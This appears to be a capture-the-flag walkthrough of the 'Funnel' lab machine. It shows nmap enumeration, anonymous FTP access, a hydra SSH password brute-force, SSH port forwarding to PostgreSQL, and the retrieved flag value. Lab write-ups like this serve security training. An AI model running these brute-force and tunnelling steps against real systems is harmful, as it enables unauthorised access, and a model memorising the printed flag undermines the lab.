# Funnel

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/47ce9229-bb3f-4081-a5da-9d64737ef83e)

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.129.24.202
[sudo] password for melle: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 03:53 CDT
Nmap scan report for 10.129.24.202
Host is up (1.00s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.79 seconds
```

`| ftp-anon: Anonymous FTP login allowed (FTP code 230)`
`|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup`

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f3b93e1f-f340-492a-8d7d-fa90af1a0da8)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/5873a8b2-b4dd-46c2-a394-0ab7582ee8f2)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4dc2f719-f89a-437e-bbf4-acc78df9aeba)
* password policy нээж үзтэл

  ![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/a1230f66-eccd-4941-955b-ab3966ba132b)

  ![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/21fad033-708b-417d-b83d-d2ffdf4f01df)
`$ hydra -L users.txt -P password.txt 10.129.24.202 ssh -t 4 -v `

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/bb52d43e-cd7b-45b2-ae6b-dfcfc1672fa0)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/68dce345-9f1b-42df-86e2-a61b0abd305d)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2c9d1dc9-ec95-4e34-b41e-e4440f221d0e)

```
┌──(melle㉿tuguldur)-[~/Downloads/funnel]
└─$ ssh -L 1234:localhost:5432 christine@10.129.24.202
christine@10.129.24.202's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 23 Apr 2024 09:19:50 AM UTC

  System load:              0.0
  Usage of /:               63.2% of 4.78GB
  Memory usage:             13%
  Swap usage:               0%
  Processes:                163
  Users logged in:          1
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.24.202
  IPv6 address for ens160:  dead:beef::250:56ff:feb0:ff8d

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/cbcb21be-f749-4c65-a6fa-44ece4f25611)


```
└─$ psql -U christine -p 1234 -h localhost 
Password for user christine: 
psql (16.2 (Debian 16.2-1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/27711ffb-c694-4510-ac2b-507140417253)


```
secrets=# SELECT *FROM flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1

```





  



``










